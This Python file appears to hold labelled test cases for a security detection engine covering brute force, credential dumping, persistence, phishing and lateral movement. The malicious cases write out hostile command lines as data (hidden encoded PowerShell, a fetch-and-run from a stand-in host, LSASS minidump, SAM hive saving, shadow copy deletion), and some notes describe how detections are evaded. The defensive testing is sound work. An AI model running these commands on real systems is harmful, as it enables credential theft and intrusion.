"""Labelled evaluation cases for every detection rule.

Each case is a small, self-contained event sequence labelled ``malicious``
or ``benign``. Cases marked ``known_limitation`` document behaviour the rule
is known to miss (or wrongly flag); they are reported honestly in the
metrics but do not fail the self-test.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta

from app.detection.base import DetectionContext, EventView

T0 = datetime(2026, 1, 15, 9, 0, tzinfo=UTC)


@dataclass
class Case:
    name: str
    label: str  # "malicious" | "benign"
    events: list[EventView]
    known_limitation: str | None = None
    context: DetectionContext = field(default_factory=DetectionContext)


def _ev(n: int, minutes: float, event_type: str, **kw: object) -> EventView:
    return EventView(id=f"fx-{n}", event_time=T0 + timedelta(minutes=minutes), event_type=event_type, **kw)  # type: ignore[arg-type]


def _failures(count: int, spacing: float, user: str = "j.alvarez", src: str = "203.0.113.45") -> list[EventView]:
    return [_ev(i, i * spacing, "auth.failure", user_name=user, src_ip=src, host="vpn-gw-01", outcome="failure") for i in range(count)]


def _lsass(n: int, source: str, access: str, target: str = "c:\\windows\\system32\\lsass.exe") -> EventView:
    return _ev(
        n,
        0,
        "process.access",
        host="fin-ws-014",
        user_name="j.alvarez",
        process_name=source.rsplit("\\", 1)[-1],
        raw={"source_image": source, "target_image": target, "granted_access": access},
    )


def _task(n: int, name: str, action: str) -> EventView:
    return _ev(n, 0, "task.created", host="fin-ws-014", user_name="j.alvarez", command_line=action, raw={"task_name": name})


def _runkey(n: int, value: str, data: str, writer: str, key: str = "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run") -> EventView:
    return _ev(n, 0, "registry.set", host="fin-ws-014", user_name="j.alvarez", process_name=writer, command_line=data, raw={"target_object": f"{key}\\{value}"})


def _rdp(n: int, minutes: float, host: str, user: str = "corp\\b.chen", src: str = "10.20.4.17") -> EventView:
    return _ev(n, minutes, "auth.success", host=host, user_name=user, src_ip=src, outcome="success", raw={"logon_type": "10"})


CASES: dict[str, list[Case]] = {
    "SF-AUTH-001": [
        Case("burst then success", "malicious", _failures(8, 0.5) + [_ev(99, 5, "auth.success", user_name="j.alvarez", src_ip="203.0.113.45", host="vpn-gw-01")]),
        Case("exactly five failures then success", "malicious", _failures(5, 1) + [_ev(99, 6, "auth.success", user_name="j.alvarez", src_ip="203.0.113.45")]),
        Case("two typos then success", "benign", _failures(2, 0.3) + [_ev(99, 1, "auth.success", user_name="j.alvarez", src_ip="203.0.113.45")]),
        Case("many failures, no success", "benign", _failures(12, 0.2)),
        Case("failures from a different source than success", "benign", _failures(7, 0.5) + [_ev(99, 5, "auth.success", user_name="j.alvarez", src_ip="10.20.4.17")]),
        Case(
            "slow guessing spread over 30 minutes",
            "malicious",
            _failures(6, 5) + [_ev(99, 31, "auth.success", user_name="j.alvarez", src_ip="203.0.113.45")],
            known_limitation="Low-and-slow guessing outside the ten-minute window is not detected.",
        ),
    ],
    "SF-PROC-001": [
        Case(
            "encoded powershell",
            "malicious",
            [
                _ev(
                    1,
                    0,
                    "process.start",
                    host="fin-ws-014",
                    process_name="powershell.exe",
                    parent_process="explorer.exe",
                    command_line="powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
                )
            ],
        ),
        Case(
            "certutil download",
            "malicious",
            [
                _ev(
                    1,
                    0,
                    "process.start",
                    host="fin-ws-014",
                    process_name="certutil.exe",
                    command_line="certutil.exe -urlcache -split -f http://cdn-update.test/a.bin C:\\Users\\Public\\a.bin",
                )
            ],
        ),
        Case(
            "word spawns powershell",
            "malicious",
            [_ev(1, 0, "process.start", host="hr-ws-002", process_name="powershell.exe", parent_process="WINWORD.EXE", command_line="powershell.exe -c Get-Date")],
        ),
        Case(
            "shadow copies deleted",
            "malicious",
            [_ev(1, 0, "process.start", host="file-srv-01", process_name="vssadmin.exe", command_line="vssadmin.exe Delete Shadows /All /Quiet")],
        ),
        Case(
            "normal powershell",
            "benign",
            [
                _ev(
                    1,
                    0,
                    "process.start",
                    host="it-ws-001",
                    process_name="powershell.exe",
                    parent_process="explorer.exe",
                    command_line="powershell.exe -File C:\\scripts\\inventory.ps1",
                )
            ],
        ),
        Case(
            "certutil decode of a certificate",
            "benign",
            [_ev(1, 0, "process.start", host="it-ws-001", process_name="certutil.exe", command_line="certutil.exe -decode cert.b64 cert.cer")],
        ),
        Case("vssadmin list", "benign", [_ev(1, 0, "process.start", host="file-srv-01", process_name="vssadmin.exe", command_line="vssadmin.exe list shadows")]),
        Case(
            "base64 piped through an alias",
            "malicious",
            [
                _ev(
                    1,
                    0,
                    "process.start",
                    host="fin-ws-014",
                    process_name="pwsh.exe",
                    command_line="pwsh -c iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SQBFAFgA')))",
                )
            ],
            known_limitation="Obfuscation that avoids the -enc flag is not matched by the pattern list.",
        ),
    ],
    "SF-IAM-001": [
        Case(
            "create then add to Domain Admins",
            "malicious",
            [
                _ev(1, 0, "iam.user_created", host="dc-01", user_name="svc_backup", target_user="helpdesk_tmp"),
                _ev(2, 4, "iam.group_member_added", host="dc-01", user_name="svc_backup", target_user="helpdesk_tmp", group_name="Domain Admins"),
            ],
        ),
        Case(
            "ubuntu: useradd then usermod -aG sudo",
            "malicious",
            [
                _ev(1, 0, "iam.user_created", host="ubuntu-srv-01", user_name="alice", target_user="svc_tmp"),
                _ev(2, 1, "iam.group_member_added", host="ubuntu-srv-01", user_name="alice", target_user="svc_tmp", group_name="sudo"),
            ],
        ),
        Case(
            "create then add to standard group",
            "benign",
            [
                _ev(1, 0, "iam.user_created", host="dc-01", user_name="it.admin", target_user="new.hire"),
                _ev(2, 2, "iam.group_member_added", host="dc-01", user_name="it.admin", target_user="new.hire", group_name="Finance Users"),
            ],
        ),
        Case(
            "existing account promoted",
            "benign",
            [
                _ev(2, 2, "iam.group_member_added", host="dc-01", user_name="it.admin", target_user="m.chen", group_name="Administrators"),
            ],
            known_limitation=None,
        ),
        Case(
            "added to admins two hours later",
            "benign",
            [
                _ev(1, 0, "iam.user_created", host="dc-01", user_name="it.admin", target_user="lab.user"),
                _ev(2, 120, "iam.group_member_added", host="dc-01", user_name="it.admin", target_user="lab.user", group_name="Administrators"),
            ],
        ),
    ],
    "SF-DEF-001": [
        Case("security log cleared", "malicious", [_ev(1, 0, "log.cleared", host="fin-ws-014", user_name="j.alvarez")]),
        Case("sysmon stopped", "malicious", [_ev(1, 0, "service.stopped", host="fin-ws-014", process_name="Sysmon64", user_name="SYSTEM")]),
        Case("print spooler stopped", "benign", [_ev(1, 0, "service.stopped", host="fin-ws-014", process_name="Spooler", user_name="it.admin")]),
    ],
    "SF-EXT-001": [
        Case(
            "defender high alert",
            "malicious",
            [_ev(1, 0, "security.alert", host="fin-ws-014", outcome="high", message="Microsoft Defender for Endpoint: Suspicious PowerShell command line")],
        ),
        Case(
            "entra id protection medium alert",
            "malicious",
            [_ev(1, 0, "security.alert", user_name="j.alvarez@example.test", outcome="medium", message="Entra ID Protection: Unfamiliar sign-in properties")],
        ),
        Case("informational alert", "benign", [_ev(1, 0, "security.alert", host="fin-ws-014", outcome="informational", message="Microsoft Defender: Test alert")]),
        Case("low severity alert", "benign", [_ev(1, 0, "security.alert", host="fin-ws-014", outcome="low", message="Microsoft Defender: Potentially unwanted application")]),
    ],
    "SF-NET-001": [
        Case("connection on 4444", "malicious", [_ev(1, 0, "network.connection", host="fin-ws-014", src_ip="10.20.4.17", dst_ip="198.51.100.23", dst_port=4444, bytes_out=18000)]),
        Case(
            "large upload", "malicious", [_ev(1, 0, "network.connection", host="eng-ws-021", src_ip="10.20.8.3", dst_ip="198.51.100.77", dst_port=443, bytes_out=240 * 1024 * 1024)]
        ),
        Case(
            "watchlisted destination",
            "malicious",
            [_ev(1, 0, "network.connection", host="fin-ws-014", src_ip="10.20.4.17", dst_ip="203.0.113.200", dst_port=443, bytes_out=1200)],
            context=DetectionContext(watchlist_ips={"203.0.113.200"}),
        ),
        Case("normal https", "benign", [_ev(1, 0, "network.connection", host="fin-ws-014", src_ip="10.20.4.17", dst_ip="198.51.100.10", dst_port=443, bytes_out=5400)]),
        Case("internal port 4444", "benign", [_ev(1, 0, "network.connection", host="dev-ws-003", src_ip="10.20.4.17", dst_ip="10.20.9.5", dst_port=4444, bytes_out=900)]),
        Case(
            "c2 over 443 with small beacons",
            "malicious",
            [_ev(1, 0, "network.connection", host="fin-ws-014", src_ip="10.20.4.17", dst_ip="198.51.100.99", dst_port=443, bytes_out=600)],
            known_limitation="Beaconing over standard ports to non-watchlisted hosts needs frequency analysis, which is not implemented.",
        ),
    ],
    "SF-MAIL-001": [
        Case(
            "phish clicked",
            "malicious",
            [
                _ev(
                    1,
                    0,
                    "email.delivered",
                    user_name="p.osei",
                    email_sender="billing@invoice-portal.example",
                    email_subject="Overdue invoice",
                    url="https://invoice-portal.example/view",
                    domain="invoice-portal.example",
                ),
                _ev(2, 7, "dns.query", host="hr-ws-002", user_name="p.osei", domain="invoice-portal.example"),
            ],
        ),
        Case(
            "phish not clicked",
            "benign",
            [
                _ev(1, 0, "email.delivered", user_name="p.osei", url="https://invoice-portal.example/view", domain="invoice-portal.example"),
            ],
        ),
        Case(
            "different user visited domain",
            "benign",
            [
                _ev(1, 0, "email.delivered", user_name="p.osei", url="https://invoice-portal.example/view", domain="invoice-portal.example"),
                _ev(2, 5, "dns.query", host="eng-ws-021", user_name="k.nakamura", domain="invoice-portal.example"),
            ],
        ),
        Case(
            "visit before email",
            "benign",
            [
                _ev(2, 0, "dns.query", host="hr-ws-002", user_name="p.osei", domain="newsletter.example"),
                _ev(1, 10, "email.delivered", user_name="p.osei", url="https://newsletter.example/issue", domain="newsletter.example"),
            ],
        ),
        Case(
            "legitimate newsletter clicked",
            "benign",
            [
                _ev(1, 0, "email.delivered", user_name="p.osei", email_sender="news@newsletter.example", url="https://newsletter.example/issue", domain="newsletter.example"),
                _ev(2, 3, "proxy.request", host="hr-ws-002", user_name="p.osei", domain="newsletter.example"),
            ],
            known_limitation="The rule cannot tell wanted mail from phishing; it relies on analyst triage.",
        ),
    ],
    "SF-CRED-001": [
        Case(
            "mimikatz-style lsass read",
            "malicious",
            [_lsass(1, "c:\\users\\public\\m.exe", "0x1010")],
        ),
        Case(
            "comsvcs minidump of lsass",
            "malicious",
            [
                _ev(
                    1,
                    0,
                    "process.start",
                    host="fin-ws-014",
                    user_name="j.alvarez",
                    process_name="rundll32.exe",
                    command_line="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\l.dmp full",
                )
            ],
        ),
        Case(
            "SAM hive saved",
            "malicious",
            [_ev(1, 0, "process.start", host="fin-ws-014", user_name="j.alvarez", process_name="reg.exe", command_line="reg.exe save HKLM\\SAM C:\\Windows\\Temp\\s.hiv")],
        ),
        Case("defender scanning lsass", "benign", [_lsass(1, "c:\\programdata\\microsoft\\windows defender\\platform\\4.18\\msmpeng.exe", "0x1fffff")]),
        Case("query-only handle to lsass", "benign", [_lsass(1, "c:\\windows\\system32\\svchost.exe", "0x1000")]),
        Case("memory read of another process", "benign", [_lsass(1, "c:\\tools\\debugger.exe", "0x1010", target="c:\\windows\\system32\\notepad.exe")]),
        Case(
            "dumper renamed to an allowlisted name",
            "malicious",
            [_lsass(1, "c:\\users\\public\\msmpeng.exe", "0x1010")],
            known_limitation="The allowlist matches image names, not paths or signatures, so a renamed tool is missed.",
        ),
        Case(
            "comsvcs called by ordinal",
            "malicious",
            [_ev(1, 0, "process.start", host="fin-ws-014", process_name="rundll32.exe", command_line="rundll32.exe comsvcs.dll #24 624 C:\\Windows\\Temp\\l.dmp full")],
            known_limitation="Calling MiniDump by export ordinal avoids the command-line pattern; Sysmon event 10 would still catch the LSASS read.",
        ),
    ],
    "SF-PERS-001": [
        Case(
            "task runs hidden powershell",
            "malicious",
            [_task(1, "\\MicrosoftEdgeUpdateCore", "powershell.exe -w hidden -nop -c iex(iwr http://cdn-update.test/a)")],
        ),
        Case("task runs a binary from AppData", "malicious", [_task(1, "\\Updater", "C:\\Users\\j.alvarez\\AppData\\Roaming\\svc\\svchost.exe")]),
        Case(
            "schtasks create from the command line",
            "malicious",
            [
                _ev(
                    1,
                    0,
                    "process.start",
                    host="fin-ws-014",
                    user_name="j.alvarez",
                    process_name="schtasks.exe",
                    command_line='schtasks.exe /create /sc onlogon /tn Sync /tr "C:\\Users\\Public\\sync.exe" /ru SYSTEM',
                )
            ],
        ),
        Case("vendor task under Program Files", "benign", [_task(1, "\\Adobe Acrobat Update Task", "C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe")]),
        Case("schtasks query", "benign", [_ev(1, 0, "process.start", host="fin-ws-014", process_name="schtasks.exe", command_line="schtasks.exe /query /fo LIST")]),
        Case(
            "per-user OneDrive updater",
            "benign",
            [_task(1, "\\OneDrive Standalone Update Task", "%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe")],
            known_limitation="Legitimate per-user updaters live in AppData and are flagged; tune with a local allowlist.",
        ),
    ],
    "SF-PERS-002": [
        Case(
            "run key launches powershell",
            "malicious",
            [_runkey(1, "updater", "powershell.exe -w hidden -enc SQBFAFgA", writer="powershell.exe")],
        ),
        Case("run key points at Temp", "malicious", [_runkey(1, "svc", "C:\\Users\\j.alvarez\\AppData\\Local\\Temp\\svc.exe", writer="m.exe")]),
        Case(
            "reg add to Run",
            "malicious",
            [
                _ev(
                    1,
                    0,
                    "process.start",
                    host="fin-ws-014",
                    user_name="j.alvarez",
                    process_name="reg.exe",
                    command_line='reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Sync /d "C:\\Users\\Public\\sync.exe" /f',
                )
            ],
        ),
        Case("installer adds a Program Files app", "benign", [_runkey(1, "SecurityHealth", "C:\\Program Files\\Vendor\\Agent\\agent.exe", writer="msiexec.exe")]),
        Case(
            "unrelated registry value",
            "benign",
            [_runkey(1, "Theme", "powershell.exe", writer="powershell.exe", key="HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize")],
        ),
        Case(
            "renamed copy under Program Files",
            "malicious",
            [_runkey(1, "Agent", "C:\\Program Files\\Common Files\\svc.exe", writer="m.exe")],
            known_limitation="An attacker with admin rights who drops the payload under Program Files is not flagged.",
        ),
    ],
    "SF-LAT-001": [
        Case("rdp from the internet", "malicious", [_rdp(1, 0, "dc-01", src="203.0.113.77")]),
        Case("rdp hops across three hosts", "malicious", [_rdp(1, 0, "fin-ws-014"), _rdp(2, 6, "file-srv-01"), _rdp(3, 14, "dc-01")]),
        Case("single internal rdp session", "benign", [_rdp(1, 0, "file-srv-01")]),
        Case("two hosts in thirty minutes", "benign", [_rdp(1, 0, "fin-ws-014"), _rdp(2, 20, "file-srv-01")]),
        Case("three hosts over two hours", "benign", [_rdp(1, 0, "fin-ws-014"), _rdp(2, 50, "file-srv-01"), _rdp(3, 110, "dc-01")]),
        Case(
            "external network logon is not rdp",
            "benign",
            [_ev(1, 0, "auth.success", host="web-01", user_name="svc_web", src_ip="203.0.113.77", raw={"logon_type": "3"})],
        ),
        Case(
            "admin patching servers",
            "benign",
            [_rdp(i, i * 5, f"app-srv-0{i}", user="it.admin") for i in range(1, 5)],
            known_limitation="Legitimate maintenance across several servers looks the same as lateral movement.",
        ),
    ],
}
